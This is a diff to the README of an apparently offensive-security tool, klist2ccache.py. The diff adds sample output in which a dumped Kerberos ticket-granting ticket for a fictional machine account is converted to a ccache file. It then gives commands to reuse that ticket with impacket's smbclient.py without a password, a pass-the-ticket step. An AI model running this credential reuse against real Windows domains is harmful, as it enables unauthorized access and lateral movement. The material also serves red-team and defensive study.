@@ -49,6 +49,23 @@ Copy the stdout of `klist tgt` and feed to script:
 
 ```bash
 python klist2ccache.py -i tgt.txt
+
+[*] Parsed ticket:
+    client     : JOTTER-PC$@LUMON.COM
+    server     : krbtgt/LUMON.COM@LUMON.COM
+    key_type   : 18
+    key        : 74f62dc212216c910b<SNIP>dc964137c70fb8f476b22852db398
+    flags      : 0x40e10000
+    start_time : 2026-03-06 17:44:00+00:00
+    end_time   : 2026-03-07 03:44:00+00:00
+    renew_till : 2026-03-13 08:13:41+00:00
+    ticket     : 1229 bytes
+
+[+] ccache written → JOTTER-PC$@LUMON.COM.ccache  (1450 bytes)
+
+[*] Use with impacket:
+    export KRB5CCNAME=JOTTER-PC$@LUMON.COM.ccache
+    smbclient.py -k -no-pass <domain>/<user>@<target>
 ```
 
 ---
